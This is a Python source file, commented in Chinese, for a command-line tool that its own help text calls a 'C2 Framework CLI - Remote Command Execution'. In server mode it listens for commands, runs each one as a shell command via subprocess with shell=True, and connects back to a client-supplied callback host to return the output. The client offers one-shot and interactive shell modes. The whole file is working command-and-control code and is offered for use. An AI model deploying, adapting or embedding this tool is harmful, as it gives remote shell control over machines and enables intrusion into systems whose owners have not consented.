# cli/cli.py
import argparse
import time
import threading
import traceback
import socket
from typing import Optional

from core.comms import SecureComm, SecureCommConfig, SecureCommServer

# 更稳健的常量（更宽松）
DEFAULT_CALLBACK_HOST = None   # 改为 None，若未提供则自动检测本机容器 IP
SEND_RETRY_INTERVAL = 1.0        # 每次重试间隔（秒）
SEND_MAX_RETRIES = 120          # 重试次数（更高）
RECEIVE_RETRY_INTERVAL = 0.5
RECEIVE_MAX_WAIT = 120          # 等待回调结果最长时间（秒）
LISTENER_READY_TIMEOUT = 10.0   # 等待 listener ready 的最长时间（秒）
CONNECT_TIMEOUT = 5.0
IO_TIMEOUT = 120.0


def get_local_ip():
    """
    获取容器在默认路由上的 IPv4 地址（不需要外网可达，只做 socket.connect 不发包）。
    常用方法：创建 UDP socket connect 到 8.8.8.8:80 再取 socket 本地地址。
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # 这里的地址不需要真的可达；connect 仅用来确定本机 outbound 接口
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        # 退路：hostname 解析
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return "127.0.0.1"


def send_with_retries(host: str, port: int, data: bytes, max_retries: int = SEND_MAX_RETRIES, wait: float = SEND_RETRY_INTERVAL):
    """
    使用 SecureComm 向 host:port 发送数据，失败则重试。
    对于握手阶段 socket 被关闭等情况会做更长退避。
    """
    last_exc = None
    for attempt in range(1, max_retries + 1):
        try:
            sc = SecureComm(host, port, is_server=False, config=SecureCommConfig(connect_timeout=CONNECT_TIMEOUT, io_timeout=IO_TIMEOUT))
            sc.send_message(data)
            return
        except Exception as e:
            last_exc = e
            msg = str(e)
            if "Socket closed before receiving expected data" in msg or "ConnectionRefusedError" in msg or "timed out" in msg:
                backoff = wait * 2
            else:
                backoff = wait
            if attempt == 1 or attempt % 10 == 0 or attempt == max_retries:
                print(f"[send_with_retries] attempt {attempt}/{max_retries} failed to {host}:{port}: {e} (backoff {backoff}s)")
            time.sleep(backoff)
    raise last_exc


def _recv_using_server_thread(bind_host: str, bind_port: int, result_container: dict, ready_event: threading.Event):
    """
    子线程：创建 SecureCommServer、start()（确保 bind/listen 完成），然后 serve_once() 接收一次消息并把结果写入 result_container。
    ready_event 在 start() 后被 set()，主线程等待 ready_event 再发送，避免 race。
    """
    server = None
    try:
        # 把 accept_timeout 设置为比 RECEIVE_MAX_WAIT 大一个安全 margin，
        # 以确保 listener 在 server 所有重试期间都能保持 accept。
        config = SecureCommConfig(accept_timeout=RECEIVE_MAX_WAIT + 10, io_timeout=IO_TIMEOUT)
        server = SecureCommServer(bind_host, bind_port, config=config)
        server.start()
        print(f"[client.listener] bound and listening on {bind_host}:{bind_port}")
        ready_event.set()
        # 阻塞等待一次连接并接收数据（最长由 accept_timeout 控制）
        data = server.serve_once()
        result_container["data"] = data
    except Exception as e:
        print("[client.listener] exception in listener thread:")
        traceback.print_exc()
        result_container["err"] = e
    finally:
        try:
            if server is not None:
                server.close()
                print("[client.listener] server closed")
        except Exception:
            pass


def run_client(host: str, port: int, command: str, callback_host: Optional[str] = DEFAULT_CALLBACK_HOST, interactive: bool = False):
    """
    client:
      - 非交互：发送一次 command 并等待返回。
      - 交互: REPL，每行命令发送并等待返回。
    发送前在子线程启动 listener 并显式 start()，以保证绑定成功（避免 race）。
    如果 callback_host 为 None，则自动检测本机容器 IP 并使用该 IP 作为回连地址（更可靠）。
    """
    if callback_host is None:
        # 自动检测本机容器 IP 地址作为 callback_host（在 Docker Compose run 情景下最可靠）
        detected_ip = get_local_ip()
        print(f"[client] auto-detected local IP for callback: {detected_ip}")
        callback_host = detected_ip

    def send_and_wait(payload: bytes):
        result_container = {"data": None, "err": None}
        ready_event = threading.Event()

        # 启动 listener 子线程
        t = threading.Thread(target=_recv_using_server_thread, args=("0.0.0.0", 5556, result_container, ready_event), daemon=True)
        t.start()

        # 等待 listener ready（更长的超时）
        if not ready_event.wait(timeout=LISTENER_READY_TIMEOUT):
            print(f"[client] warning: listener not ready after {LISTENER_READY_TIMEOUT}s, proceeding anyway")

        # 给 listener 一个小延迟，确保系统级别 bind/listen 全部生效
        time.sleep(0.2)

        # 发送命令
        try:
            send_with_retries(host, port, payload)
        except Exception as e:
            print(f"Client: Failed to send command -> {e}")
            return None, e

        # 等待接收线程返回
        t.join(RECEIVE_MAX_WAIT + 5)
        if result_container.get("data") is not None:
            return result_container["data"], None
        else:
            return None, result_container.get("err")

    if not interactive:
        payload = f"{command}|||CALLBACK_HOST={callback_host}".encode("utf-8")
        print(f"Client: Sending command to {host}:{port} (callback_host={callback_host})")
        data, err = send_and_wait(payload)
        if data is not None:
            try:
                print(f"Client: Command result: {data.decode(errors='replace')}")
            except Exception:
                print("Client: Received non-decodable bytes.")
        else:
            print(f"Client: No result received. err={err}")
        return

    # interactive REPL
    print("Interactive mode: enter commands to run on the server. Type 'exit' or Ctrl-D to quit.")
    while True:
        try:
            cmd = input("$ ")
        except EOFError:
            print("\nExiting interactive shell.")
            break
        if cmd is None:
            break
        cmd = cmd.strip()
        if cmd == "":
            continue
        if cmd.lower() in ("exit", "quit"):
            print("Exiting interactive shell.")
            break

        payload = f"{cmd}|||CALLBACK_HOST={callback_host}".encode("utf-8")
        data, err = send_and_wait(payload)
        if data is not None:
            try:
                print(data.decode(errors="replace"))
            except Exception:
                print("Client: Received non-decodable bytes.")
        else:
            print(f"Client: No result received. err={err}")


def run_server(host: str, port: int):
    """
    Server: 持续监听命令，期望每条命令带 callback_host。
    执行后通过回连 callback_host:5556 把结果发送回 client（使用 send_with_retries）。
    """
    print(f"Server: Waiting for command at {host}:{port}")
    config = SecureCommConfig(accept_timeout=3.0, io_timeout=IO_TIMEOUT)

    while True:
        try:
            comm = SecureComm(host, port, is_server=True, config=config)
            raw = comm.receive_message()
        except TimeoutError:
            continue
        except Exception as e:
            print(f"Server: error while waiting for message: {e}")
            traceback.print_exc()
            time.sleep(0.5)
            continue

        if raw is None:
            continue

        try:
            text = raw.decode("utf-8", errors="replace")
        except Exception:
            text = str(raw)

        marker = "|||CALLBACK_HOST="
        callback_host: Optional[str] = None
        command = text
        if marker in text:
            before, sep, after = text.partition(marker)
            if sep:
                command = before
                callback_host = after.strip()

        print(f"Server: Received command: {command} (callback_host={callback_host})")

        # 执行命令
        try:
            result = execute_command(command)
            result_bytes = result
        except Exception as e:
            result_bytes = f"Error executing command: {e}".encode("utf-8")

        if callback_host:
            try:
                print(f"Server: Sending result back to {callback_host}:5556")
                send_with_retries(callback_host, 5556, result_bytes)
            except Exception as e:
                print(f"Server: Failed to send result to {callback_host}:5556 -> {e}")
                traceback.print_exc()
        else:
            print("Server: No callback_host provided; cannot send result back.")


def execute_command(command: str) -> bytes:
    """执行 shell 命令并返回字节结果"""
    import subprocess
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result
    except subprocess.CalledProcessError as e:
        return e.output
    except Exception as e:
        return f"Exception running command: {e}".encode("utf-8")


def main():
    parser = argparse.ArgumentParser(description="C2 Framework CLI - Remote Command Execution")
    subparsers = parser.add_subparsers(dest="mode", help="Mode of operation (client or server)")

    # 客户端
    client_parser = subparsers.add_parser("client", help="Run the client")
    client_parser.add_argument("--host", type=str, required=True, help="Server IP address or hostname")
    client_parser.add_argument("--port", type=int, required=True, help="Server port")
    client_parser.add_argument("--command", type=str, required=False, help="Command to execute on the server")
    client_parser.add_argument("--callback-host", type=str, default=None,
                               help="Host for server to callback to (default: auto-detect container IP)")
    client_parser.add_argument("--interactive", "-i", action="store_true", help="Enter interactive shell mode")

    # 服务器
    server_parser = subparsers.add_parser("server", help="Run the server")
    server_parser.add_argument("--host", type=str, required=True, help="Server IP address to bind")
    server_parser.add_argument("--port", type=int, required=True, help="Port to listen on")

    args = parser.parse_args()

    if args.mode == "client":
        if args.interactive:
            run_client(args.host, args.port, command="", callback_host=args.callback_host, interactive=True)
        else:
            if args.command is None:
                print("Client mode requires --command unless --interactive is used.")
            else:
                run_client(args.host, args.port, args.command, callback_host=args.callback_host, interactive=False)
    elif args.mode == "server":
        run_server(args.host, args.port)
    else:
        print("Invalid mode. Please choose 'client' or 'server'.")
        parser.print_help()


if __name__ == "__main__":
    main()
